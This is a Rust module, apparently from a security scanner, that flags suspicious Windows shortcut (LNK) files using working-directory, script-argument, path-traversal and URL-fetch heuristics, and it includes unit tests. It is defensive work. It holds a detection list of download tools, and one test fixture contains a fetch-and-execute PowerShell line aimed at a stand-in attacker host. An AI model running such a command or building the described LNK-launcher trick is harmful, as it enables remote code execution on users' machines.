//! LNK working-directory anomaly detector (TASK-289).
//!
//! Builds on [`crate::doc_payload::lnk`]. A LNK shortcut whose
//! target lives in a system location (`C:\Windows\System32\`,
//! `C:\Windows\SysWOW64\`, `C:\Program Files\…`) but whose
//! working dir is `%TEMP%`, `%APPDATA%`, or the Downloads
//! folder is the classic LNK-launcher trick (target = a real
//! signed binary like `cmd.exe`, working_dir = where the
//! attacker dropped their script).
//!
//! Five-rule heuristic:
//!
//!   1. target lives in a system dir
//!   2. working_dir resolves to a user-writable dir
//!   3. command-line arguments reference `.ps1` / `.bat` /
//!      `.cmd` / `.vbs` / `.js` files
//!   4. the relative_path is `..\` style
//!   5. command_arguments contains URL-fetching primitives
//!
//! Rule 1 + 2 must both fire for a P1; any single rule fires
//! a P3 informational.

use serde::{Deserialize, Serialize};

use crate::doc_payload::lnk::LnkInfo;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LnkAnomalyFinding {
    /// `target_in_system_dir`, `working_dir_user_writable`,
    /// `argument_runs_script`, `parent_dir_traversal`,
    /// `argument_fetches_url`.
    pub rules_fired: Vec<String>,
    pub severity: LnkSeverity,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LnkSeverity {
    P1,
    P3,
}

const SYSTEM_DIR_NEEDLES: &[&str] = &[
    "\\windows\\system32\\",
    "\\windows\\syswow64\\",
    "\\program files\\",
    "\\program files (x86)\\",
    "\\windows\\winsxs\\",
];

const USER_WRITABLE_NEEDLES: &[&str] = &[
    "%temp%",
    "%tmp%",
    "%appdata%",
    "%localappdata%",
    "\\downloads",
    "\\users\\public",
    "\\appdata\\local\\temp",
];

const SCRIPT_EXTENSIONS: &[&str] = &[".ps1", ".bat", ".cmd", ".vbs", ".js", ".hta", ".wsf"];

const URL_PRIMITIVES: &[&str] = &[
    "invoke-webrequest",
    "iwr ",
    "downloadstring",
    "downloadfile",
    "curl ",
    "wget ",
    "bitsadmin",
    "certutil -urlcache",
    "http://",
    "https://",
];

pub fn evaluate(info: &LnkInfo, target_path: Option<&str>) -> Option<LnkAnomalyFinding> {
    let mut rules: Vec<String> = Vec::new();

    if let Some(tp) = target_path.map(|s| s.to_ascii_lowercase()) {
        if SYSTEM_DIR_NEEDLES.iter().any(|n| tp.contains(n)) {
            rules.push("target_in_system_dir".into());
        }
    }
    if let Some(wd) = info.working_dir.as_deref().map(|s| s.to_ascii_lowercase()) {
        if USER_WRITABLE_NEEDLES.iter().any(|n| wd.contains(n)) {
            rules.push("working_dir_user_writable".into());
        }
    }
    if let Some(args) = info.command_arguments.as_deref() {
        let lc = args.to_ascii_lowercase();
        if SCRIPT_EXTENSIONS.iter().any(|ext| lc.contains(ext)) {
            rules.push("argument_runs_script".into());
        }
        if URL_PRIMITIVES.iter().any(|n| lc.contains(n)) {
            rules.push("argument_fetches_url".into());
        }
    }
    if let Some(rel) = info.relative_path.as_deref() {
        if rel.contains("..\\") || rel.contains("../") {
            rules.push("parent_dir_traversal".into());
        }
    }

    let has = |needle: &str| rules.iter().any(|r| r == needle);
    let suspicious_behavior = has("working_dir_user_writable")
        || has("argument_runs_script")
        || has("argument_fetches_url")
        || has("parent_dir_traversal");
    if !suspicious_behavior {
        // `target_in_system_dir` alone isn't anomalous — most
        // Start-Menu shortcuts target Program Files / System32.
        return None;
    }
    let severity = if has("target_in_system_dir") && has("working_dir_user_writable") {
        LnkSeverity::P1
    } else {
        LnkSeverity::P3
    };
    Some(LnkAnomalyFinding {
        rules_fired: rules,
        severity,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn info(working_dir: &str, args: &str, relative: Option<&str>) -> LnkInfo {
        LnkInfo {
            working_dir: Some(working_dir.to_string()),
            command_arguments: Some(args.to_string()),
            relative_path: relative.map(str::to_string),
            link_flags: 0,
            ..Default::default()
        }
    }

    #[test]
    fn classic_lnk_launcher_is_p1() {
        let lnk = info("%TEMP%", "/c powershell -EncodedCommand AAA", None);
        let f = evaluate(&lnk, Some("C:\\Windows\\System32\\cmd.exe")).unwrap();
        assert_eq!(f.severity, LnkSeverity::P1);
        assert!(f.rules_fired.iter().any(|r| r == "target_in_system_dir"));
        assert!(f.rules_fired.iter().any(|r| r == "working_dir_user_writable"));
    }

    #[test]
    fn script_argument_alone_is_p3() {
        let lnk = info(
            "C:\\Users\\alice\\Documents",
            "/c run.ps1",
            None,
        );
        let f = evaluate(&lnk, Some("C:\\Users\\alice\\Documents\\helper.exe")).unwrap();
        assert_eq!(f.severity, LnkSeverity::P3);
        assert!(f.rules_fired.iter().any(|r| r == "argument_runs_script"));
    }

    #[test]
    fn benign_lnk_returns_none() {
        let lnk = info(
            "C:\\Program Files\\Vendor",
            "",
            None,
        );
        assert!(evaluate(&lnk, Some("C:\\Program Files\\Vendor\\app.exe")).is_none());
    }

    #[test]
    fn url_fetching_argument_flagged() {
        let lnk = info(
            "C:\\Users\\bob\\Downloads",
            "-c \"iwr https://evil.example/payload.ps1 | iex\"",
            None,
        );
        let f = evaluate(&lnk, Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")).unwrap();
        assert!(f.rules_fired.iter().any(|r| r == "argument_fetches_url"));
        // Both system-dir + user-writable working dir fire → P1.
        assert_eq!(f.severity, LnkSeverity::P1);
    }

    #[test]
    fn parent_dir_traversal_rule_fires() {
        let lnk = info(
            "C:\\Users\\bob\\Documents",
            "",
            Some("..\\..\\Downloads\\payload.exe"),
        );
        let f = evaluate(&lnk, None).unwrap();
        assert!(f.rules_fired.iter().any(|r| r == "parent_dir_traversal"));
        assert_eq!(f.severity, LnkSeverity::P3);
    }

    #[test]
    fn missing_target_path_does_not_panic() {
        let lnk = info("%TEMP%", "/c foo.bat", None);
        let f = evaluate(&lnk, None).unwrap();
        // No target → only working_dir + argument rules apply → P3.
        assert_eq!(f.severity, LnkSeverity::P3);
    }
}
